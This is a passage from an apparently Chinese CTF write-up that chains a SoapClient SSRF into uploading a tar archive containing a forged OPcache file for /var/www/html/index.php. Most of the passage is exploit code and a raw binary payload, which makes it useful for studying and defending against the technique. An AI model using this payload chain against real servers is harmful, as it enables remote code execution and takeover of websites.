class="hljs-title function_ invoke__">tar_file</span>()<br>request_content = <span class="hljs-title function_ invoke__">upload</span>()<br>upload_body = <span class="hljs-title function_ invoke__">str</span>(request_content.body).<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>)<br>content_length = request_content.headers[<span class="hljs-string">&#x27;Content-Length&#x27;</span>]<br>with <span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;ssrf_data.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.<span class="hljs-title function_ invoke__">write</span>(upload_body+<span class="hljs-string">&#x27;\n&#x27;</span>+content_length)<br></code></pre></td></tr></table></figure><p>接着就是怎么将这个文件包传上去</p><p>又回到index.php，index.php可以调用任意的无参方法，又要ssrf，上传文件，那么想到的只有php原生类<code>SoapClient</code>去打ssrf</p><p>也就是SoapClient的__call方法，SoapClient类，调用一个不存在的函数会去调用<code>__call</code>方法</p><p>这里注意Content-Length刚刚脚本单独打印出来了以防错误</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">siroha</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$koi</span>;<br><br>&#125;<br><span class="hljs-variable">$postdata</span> = <span class="hljs-string">&quot;--229aafba818c5da83cd0547a3a0002d5\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;exp.tar\&quot;\r\nContent-Type: application/x-tar\r\n\r\n214510e772fba140ea7a33a277f2799e/var/www/html/\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000777\x000000000\x000000000\x0000000000000\x0000000000000\x00014543\x00 5\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00././@PaxHeader\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000000\x000000000\x000000000\x0000000000033\x0000000000000\x00010211\x00 x\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0027 mtime=1702627731.878734\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00214510e772fba140ea7a33a277f2799e/var/www/html/index.php.bin\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000666\x000000000\x000000000\x0000000001760\x0014537004624\x00017202\x00 0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00OPCACHE\x00214510e772fba140ea7a33a277f2799e0\x03\x00\x00\x00\x00\x00\x00p\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x91\x08|e\x00\x00\x00\x004e\xad\x89\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x000\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00 \x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x02\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x18\x00\x00\x00\xfe\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x18\x00\x00\x00\xfe\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\xf4&#123;e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000\x03\x00\x00\xd2XR5\xe1\xf8&#123;e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x001\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00Q\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00&gt;\x05\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xffP\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x009\x00\x00\x027\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xffp\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00P\x01\x00\x02A\x06\x00\x00\x00\x00\x00\x00p\x00\x00\x00\x01\x00\x00\x00`\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00Q\x02\x01\x02\xf1\x05\x00\x00\x00\x00\x00\x00`\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x01\x00\x00\x00\x01\x00\x00\x00I\x02\x00\x00?\x05\x00\x00\x00\x00\x00\x00P\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x01\x00\x00\x00:\x02\x00\x00F\x05\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x01\x00\x00\x00&gt;\x01\x00\x00\x02\x00\x00\x00V\x01\x00\x00\xb2$\x83\xaf\xdd\xaa\xdf\x8c\x17\x00\x00\x00\x00\x00\x00\x00/var/www/html/index.php\x00R\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00V\x00\x00\x00\xb2$\x83\xaf\xdd\xaa\xdf\x8c\x17\x00\x00\x00\x00\x00\x00\x00/var/www/html/index.php\x00\x02\x00\x00\x00V\x00\x00\x00jQ\xe3\x0e1\x00\x00\x80\x05\x00\x00\x00\x00\x00\x00\x00_POST\x00\x00\x00\x02\x00\x00\x00V\x00\x00\x00M\xc1\x88\x0b\x00\x00\x00\x80\x03\x00\x00\x00\x00\x00\x00\x00xxx\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00